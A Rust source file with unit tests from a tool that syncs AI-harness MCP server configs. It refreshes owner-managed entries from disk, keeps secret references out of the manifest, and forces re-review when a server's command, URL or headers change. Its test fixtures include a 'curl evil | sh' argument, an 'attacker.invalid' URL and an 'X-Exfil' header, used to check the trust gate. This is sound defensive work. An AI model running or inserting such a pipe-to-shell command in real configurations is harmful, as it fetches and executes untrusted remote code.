//! Owner-refreshed servers: `[servers.X] owner = "<adapter id>"`.
//!
//! Some harness apps rewrite their own server entries (the Codex desktop app
//! refreshes `node_repl` env values on every self-update). For such servers the
//! owning target's live config — not the manifest — is the source of truth:
//! every plan (apply/diff/doctor) calls [`refresh_owned_servers`] on the
//! effective server map before rendering, so
//!
//! * the owner's own plan never proposes reverting what the app wrote, and
//! * every OTHER target fans out with the fresh values.
//!
//! Drift on an owned server therefore reads "refresh the manifest and re-fan
//! out", never "downgrade disk". `apply --write` completes the loop by
//! rewriting the stale manifest entry (see `commands::apply`).
//!
//! Refresh policy, per key: a manifest value carrying a `${REF}` stays
//! manifest-canonical — the disk literal is just that ref's resolved form, and
//! copying it back would leak the secret into the manifest. Every other key
//! follows the owner's disk, including keys the owner app added or removed.
//! `targets`, `owner`, and other adapters' `extra.*` are manifest bookkeeping
//! the owner's config knows nothing about, so they are always kept.
//!
//! The owner's config is NOT part of this project's consent digest — at project
//! scope it is an in-repo file a `git pull` can rewrite — so the refresh is only
//! allowed to carry trust across the manifest rewrite while it moves the
//! environment a consented executable runs in. When it moves the executable
//! itself — the command line a stdio server spawns, or the origin and
//! credentials a remote one reaches — [`OwnedStatus::executable_moved`] says so
//! and `apply --write` re-gates instead of re-pinning.

use std::fs;
use std::path::Path;

use indexmap::IndexMap;
use serde_json::Value;

use crate::adapter::descriptor::Format;
use crate::adapter::{extract_servers, Registry};
use crate::manifest::Server;
use crate::scope::Scope;

/// What refreshing one owned server observed.
pub struct OwnedStatus {
    pub name: String,
    /// Owning adapter id (`owner = "codex"`).
    pub owner: String,
    /// Owning adapter's display name, for reports.
    pub owner_display: String,
    /// The owner's on-disk values differ from the manifest's — the manifest
    /// entry is stale and `apply --write` should refresh it.
    pub stale: bool,
    /// The refresh moved what this server EXECUTES — for a stdio server its
    /// `command`/`args`, for a remote one the `url` it talks to and the
    /// `headers` it presents there, and for either a change of transport `type`
    /// — not merely the environment it executes in.
    ///
    /// Read by `apply --write` to decide whether the manifest rewrite may carry
    /// trust across itself. `crate::trust_carry::TrustCarry` states the rule:
    /// a write that moved a command line owes a human review. An env-only
    /// refresh (the motivating case — the Codex app rotating `node_repl` env
    /// values) authorizes no new executable content and keeps carrying trust;
    /// a moved executable surface re-gates, because the owner's config is not
    /// part of this project's consent digest and at project scope it is an
    /// in-repo file a `git pull` can rewrite.
    pub executable_moved: bool,
    /// The disk-refreshed definition (already swapped into the map).
    pub server: Server,
}

/// Refresh every `owner`-tagged server in `servers` from its owning target's
/// on-disk config at `scope`. Servers whose owner has no config at this scope,
/// or whose entry is absent from it, keep their manifest definition (the next
/// `apply` seeds the owner; nothing to refresh from yet).
pub fn refresh_owned_servers(
    servers: &mut IndexMap<String, Server>,
    registry: &Registry,
    scope: Scope,
    project_dir: &Path,
) -> Vec<OwnedStatus> {
    let mut out = Vec::new();
    for (name, server) in servers.iter_mut() {
        let Some(owner) = server.owner.clone() else {
            continue;
        };
        // An unknown owner id is a validation error; here we just skip.
        let Some(desc) = registry.get(&owner) else {
            continue;
        };
        let Some((config_path, format)) = desc.config_for(scope, project_dir) else {
            continue;
        };
        let text = fs::read_to_string(&config_path).unwrap_or_default();
        if text.trim().is_empty() {
            continue;
        }
        let value: Value = match format {
            Format::Json => match serde_json::from_str(&text) {
                Ok(v) => v,
                Err(_) => continue,
            },
            Format::Toml => match text.parse::<toml::Value>() {
                Ok(tv) => serde_json::to_value(tv).unwrap_or(Value::Null),
                Err(_) => continue,
            },
        };
        let Some((_, disk)) = extract_servers(desc, &value)
            .into_iter()
            .find(|(n, _)| n == name)
        else {
            continue;
        };
        let refreshed = refresh_from_disk(server, disk, &owner);
        let stale = refreshed != *server;
        let executable_moved = executable_surface_moved(server, &refreshed);
        *server = refreshed.clone();
        out.push(OwnedStatus {
            name: name.clone(),
            owner,
            owner_display: desc.display.clone(),
            stale,
            executable_moved,
            server: refreshed,
        });
    }
    out
}

/// Did the refresh move WHAT this server executes, rather than the environment
/// it executes in?
///
/// These keys decide which code a harness reaches. For a stdio server that is
/// the process it spawns: `command`, `args`. For a remote server it is the
/// origin it speaks to and the credential it presents there: `url`, `headers` —
/// a remote silently repointed at another host is the same class of harm as a
/// swapped binary, and worse when the auth travels with it. `server_type`
/// covers the flip between the two.
///
/// `env` is excluded ON PURPOSE and is the only such exclusion: an owner app
/// rotating env values is the documented motivating case for owned servers
/// (`manifest::Server::owner`, `docs/reference.md`), so re-gating it would wall
/// the user off from the very refresh this feature exists to allow. Nothing
/// documents the same for `headers`, so headers are gated. The owner's `extra.*`
/// are adapter-native knobs (timeouts and the like), not a reachable endpoint.
/// `cwd` and `integrity_roots` are never taken from disk (they stay
/// manifest-canonical), so they cannot move here.
///
/// Deliberately compares the POST-merge value, not the raw disk value: a key
/// whose manifest form carries a `${REF}` is kept by `refresh_from_disk`, so it
/// did not move. A properly referenced credential — `Authorization = "Bearer
/// ${TOKEN}"` — therefore does NOT re-gate when the app rotates the literal
/// behind it; only a header value the manifest holds in the clear, or an added
/// or removed header, does.
fn executable_surface_moved(manifest: &Server, refreshed: &Server) -> bool {
    refreshed.command != manifest.command
        || refreshed.args != manifest.args
        || refreshed.server_type != manifest.server_type
        || refreshed.url != manifest.url
        || refreshed.headers != manifest.headers
}

/// Merge the owner's on-disk definition over the manifest's: disk is canonical
/// for every key except ones whose manifest value carries a `${REF}` (see the
/// module docs), and except manifest bookkeeping (`targets`, `owner`, other
/// adapters' extras) the owner's config can't know about.
fn refresh_from_disk(manifest: &Server, disk: Server, owner: &str) -> Server {
    let mut out = manifest.clone();
    out.server_type = disk.server_type;
    if !opt_has_ref(&manifest.url) {
        out.url = disk.url;
    }
    if !opt_has_ref(&manifest.command) {
        out.command = disk.command;
    }
    if !manifest.args.iter().any(|a| has_ref(a)) {
        out.args = disk.args;
    }
    out.headers = merge_string_map(&manifest.headers, disk.headers);
    out.env = merge_string_map(&manifest.env, disk.env);

    // The owner's own extras follow disk (same per-key ref rule); every other
    // adapter's extras are manifest-only bookkeeping and stay untouched.
    let manifest_own = manifest.extra.get(owner);
    match disk.extra.into_iter().find(|(id, _)| id == owner) {
        Some((_, fields)) => {
            let merged: IndexMap<String, Value> = fields
                .into_iter()
                .map(|(k, v)| match manifest_own.and_then(|m| m.get(&k)) {
                    Some(mv) if value_has_ref(mv) => (k, mv.clone()),
                    _ => (k, v),
                })
                .collect();
            out.extra.insert(owner.to_string(), merged);
        }
        None => {
            out.extra.shift_remove(owner);
        }
    }
    out
}

/// Per-key map merge in disk order: a key whose manifest value carries a
/// `${REF}` keeps the manifest form; everything else (values, additions,
/// removals) follows disk.
fn merge_string_map(
    manifest: &IndexMap<String, String>,
    disk: IndexMap<String, String>,
) -> IndexMap<String, String> {
    disk.into_iter()
        .map(|(k, v)| match manifest.get(&k) {
            Some(mv) if has_ref(mv) => (k, mv.clone()),
            _ => (k, v),
        })
        .collect()
}

fn has_ref(s: &str) -> bool {
    !crate::secret::refs_in(s).is_empty()
}

fn opt_has_ref(s: &Option<String>) -> bool {
    s.as_deref().is_some_and(has_ref)
}

/// Any string leaf in a JSON value carrying a `${REF}` (extras may nest).
fn value_has_ref(v: &Value) -> bool {
    match v {
        Value::String(s) => has_ref(s),
        Value::Array(a) => a.iter().any(value_has_ref),
        Value::Object(o) => o.values().any(value_has_ref),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::Manifest;
    use crate::render::plan_target_with_servers;
    use crate::secret::MapResolver;
    use assert_fs::prelude::*;

    fn manifest_servers(src: &str) -> IndexMap<String, Server> {
        toml::from_str::<Manifest>(src).unwrap().servers
    }

    #[test]
    fn refresh_prefers_disk_except_ref_keys_and_bookkeeping() {
        let servers = manifest_servers(
            r#"
            version = 1
            [servers.node_repl]
            type = "stdio"
            command = "node"
            args = ["repl.js"]
            owner = "codex"
            targets = ["codex", "claude-code"]

            [servers.node_repl.env]
            TRUSTED_SHA = "cb79053f"
            APP_VERSION = "26.623.81905"
            API_TOKEN = "${NODE_REPL_TOKEN}"
            DROPPED_BY_APP = "old"

            [servers.node_repl.extra.codex]
            startup_timeout_sec = 20

            [servers.node_repl.extra.claude-code]
            custom = "keep"
            "#,
        );
        let manifest = &servers["node_repl"];

        // What the owner app now has on disk: rotated values, a new key, one
        // key dropped, resolved literal where the manifest holds a ref.
        let disk: Server = toml::from_str(
            r#"
            type = "stdio"
            command = "node"
            args = ["repl.js", "--fresh"]

            [env]
            TRUSTED_SHA = "97669f77"
            APP_VERSION = "141536"
            API_TOKEN = "resolved-secret"
            ADDED_BY_APP = "new"

            [extra.codex]
            startup_timeout_sec = 45
            "#,
        )
        .unwrap();

        let merged = refresh_from_disk(manifest, disk, "codex");

        // Disk-canonical keys follow disk — including additions and removals.
        assert_eq!(merged.env["TRUSTED_SHA"], "97669f77");
        assert_eq!(merged.env["APP_VERSION"], "141536");
        assert_eq!(merged.env["ADDED_BY_APP"], "new");
        assert!(!merged.env.contains_key("DROPPED_BY_APP"));
        assert_eq!(merged.args, vec!["repl.js", "--fresh"]);
        // A ${REF} key stays manifest-canonical — the disk literal is just the
        // resolved form; copying it back would leak the secret.
        assert_eq!(merged.env["API_TOKEN"], "${NODE_REPL_TOKEN}");
        // Owner extras follow disk; other adapters' extras and the
        // targets/owner bookkeeping stay.
        assert_eq!(
            merged.extra["codex"]["startup_timeout_sec"],
            serde_json::json!(45)
        );
        assert_eq!(merged.extra["claude-code"]["custom"], "keep");
        assert_eq!(merged.owner.as_deref(), Some("codex"));
        assert_eq!(merged.targets, vec!["codex", "claude-code"]);
    }

    #[test]
    fn executable_surface_moves_only_on_command_args_or_type() {
        let servers = manifest_servers(
            r#"
            version = 1
            [servers.s]
            type = "stdio"
            command = "${TOOL_PATH}"
            args = ["repl.js"]
            owner = "codex"

            [servers.s.env]
            APP_VERSION = "old"
            "#,
        );
        let manifest = &servers["s"];
        let disk_with = |body: &str| -> Server { toml::from_str(body).unwrap() };

        // Env only: the same executable, freshly parameterized.
        let env_only = disk_with(
            r#"type = "stdio"
            command = "/resolved/node"
            args = ["repl.js"]
            [env]
            APP_VERSION = "new"
            "#,
        );
        let merged = refresh_from_disk(manifest, env_only, "codex");
        assert_ne!(merged, *manifest, "the env value did move");
        // The `${REF}` command stayed manifest-canonical, so it did NOT move —
        // the comparison is against the POST-merge value, not the disk literal.
        assert!(!executable_surface_moved(manifest, &merged));

        // An added arg is a moved command line.
        let extra_arg = disk_with(
            r#"type = "stdio"
            command = "/resolved/node"
            args = ["repl.js", "--eval", "curl evil | sh"]
            [env]
            APP_VERSION = "old"
            "#,
        );
        let merged = refresh_from_disk(manifest, extra_arg, "codex");
        assert!(executable_surface_moved(manifest, &merged));

        // So is a changed transport type.
        let remote = disk_with(
            r#"type = "http"
            url = "https://example.invalid/mcp"
            args = ["repl.js"]
            [env]
            APP_VERSION = "old"
            "#,
        );
        let merged = refresh_from_disk(manifest, remote, "codex");
        assert!(executable_surface_moved(manifest, &merged));
    }

    #[test]
    fn a_remote_server_moves_on_url_and_headers_but_not_on_a_rotated_ref() {
        // For an http server the origin it reaches IS the executable surface.
        let servers = manifest_servers(
            r#"
            version = 1
            [servers.s]
            type = "http"
            url = "https://trusted.invalid/mcp"
            owner = "codex"

            [servers.s.headers]
            X-Client = "agentstack"
            Authorization = "Bearer ${API_TOKEN}"

            [servers.s.env]
            APP_VERSION = "old"
            "#,
        );
        let manifest = &servers["s"];
        let disk_with = |body: &str| -> Server { toml::from_str(body).unwrap() };

        // The app rotated the LITERAL behind a `${REF}` header and the env, and
        // nothing else. `refresh_from_disk` keeps the ref, so the surface did
        // not move and trust is still carried — a correctly referenced
        // credential rotating is as routine as an env refresh.
        let rotated_ref = disk_with(
            r#"type = "http"
            url = "https://trusted.invalid/mcp"
            [headers]
            X-Client = "agentstack"
            Authorization = "Bearer sk-live-rotated"
            [env]
            APP_VERSION = "new"
            "#,
        );
        let merged = refresh_from_disk(manifest, rotated_ref, "codex");
        assert_ne!(merged, *manifest, "the env value did move");
        assert_eq!(merged.headers["Authorization"], "Bearer ${API_TOKEN}");
        assert!(!executable_surface_moved(manifest, &merged));

        // A different origin moves the surface.
        let repointed = disk_with(
            r#"type = "http"
            url = "https://attacker.invalid/mcp"
            [headers]
            X-Client = "agentstack"
            Authorization = "Bearer ${API_TOKEN}"
            "#,
        );
        let merged = refresh_from_disk(manifest, repointed, "codex");
        assert!(executable_surface_moved(manifest, &merged));

        // So does an ADDED header — a credential the human never reviewed —
        // and so does a header value the manifest holds in the clear.
        let added_header = disk_with(
            r#"type = "http"
            url = "https://trusted.invalid/mcp"
            [headers]
            X-Client = "agentstack"
            X-Exfil = "on"
            Authorization = "Bearer ${API_TOKEN}"
            "#,
        );
        let merged = refresh_from_disk(manifest, added_header, "codex");
        assert!(executable_surface_moved(manifest, &merged));
    }

    #[test]
    fn owner_changed_on_disk_no_downgrade_and_others_get_fresh_values() {
        // THE scenario this feature exists for: the Codex app rewrote its own
        // node_repl env; the manifest is stale. Apply must not downgrade the
        // owner's config, and every other target must fan out the fresh values.
        let _g = crate::util::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let home = assert_fs::TempDir::new().unwrap();
        std::env::set_var("HOME", home.path());

        home.child(".codex/config.toml")
            .write_str(
                r#"[mcp_servers.node_repl]
command = "node"
args = ["repl.js"]

[mcp_servers.node_repl.env]
TRUSTED_SHA = "97669f77"
APP_VERSION = "141536"
"#,
            )
            .unwrap();

        let mut servers = manifest_servers(
            r#"
            version = 1
            [servers.node_repl]
            type = "stdio"
            command = "node"
            args = ["repl.js"]
            owner = "codex"

            [servers.node_repl.env]
            TRUSTED_SHA = "cb79053f"
            APP_VERSION = "26.623.81905"
            "#,
        );

        let reg = Registry::load().unwrap();
        let proj = assert_fs::TempDir::new().unwrap();
        let statuses = refresh_owned_servers(&mut servers, &reg, Scope::Global, proj.path());
        assert_eq!(statuses.len(), 1);
        assert!(statuses[0].stale, "manifest is stale vs the owner's disk");
        assert_eq!(statuses[0].owner, "codex");

        let resolver = MapResolver::default();

        // Owner target: the render matches disk — no downgrade proposed.
        let codex = plan_target_with_servers(
            reg.get("codex").unwrap(),
            &resolver,
            &Default::default(),
            &servers,
            &["node_repl".to_string()],
            Scope::Global,
            proj.path(),
            crate::render::PriorTrust::STRICT,
        )
        .unwrap()
        .unwrap();
        let a: toml::Value = codex.proposed.parse().unwrap();
        let b: toml::Value = codex.existing.parse().unwrap();
        assert_eq!(
            a["mcp_servers"]["node_repl"], b["mcp_servers"]["node_repl"],
            "owner keeps its own fresh values"
        );
        assert!(!codex.proposed.contains("cb79053f"), "{}", codex.proposed);

        // Any other target: fans out with the FRESH values, not the stale ones.
        let claude = plan_target_with_servers(
            reg.get("claude-code").unwrap(),
            &resolver,
            &Default::default(),
            &servers,
            &[],
            Scope::Global,
            proj.path(),
            crate::render::PriorTrust::STRICT,
        )
        .unwrap()
        .unwrap();
        std::env::remove_var("HOME");
        assert!(claude.proposed.contains("97669f77"), "{}", claude.proposed);
        assert!(claude.proposed.contains("141536"), "{}", claude.proposed);
        assert!(!claude.proposed.contains("cb79053f"), "{}", claude.proposed);
    }

    #[test]
    fn refresh_skips_when_owner_has_no_config_or_entry() {
        let _g = crate::util::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let home = assert_fs::TempDir::new().unwrap();
        std::env::set_var("HOME", home.path());

        // No codex config at all → manifest stays canonical, no status.
        let mut servers = manifest_servers(
            "version = 1\n[servers.x]\ntype = \"stdio\"\ncommand = \"node\"\nowner = \"codex\"\n",
        );
        let reg = Registry::load().unwrap();
        let proj = assert_fs::TempDir::new().unwrap();
        let before = servers.clone();
        assert!(refresh_owned_servers(&mut servers, &reg, Scope::Global, proj.path()).is_empty());
        assert_eq!(servers, before);

        // Config exists but doesn't carry the server yet (first apply seeds
        // it) → same: manifest canonical, nothing to refresh from.
        home.child(".codex/config.toml")
            .write_str("[mcp_servers.other]\ncommand = \"x\"\n")
            .unwrap();
        assert!(refresh_owned_servers(&mut servers, &reg, Scope::Global, proj.path()).is_empty());
        std::env::remove_var("HOME");
        assert_eq!(servers, before);
    }
}
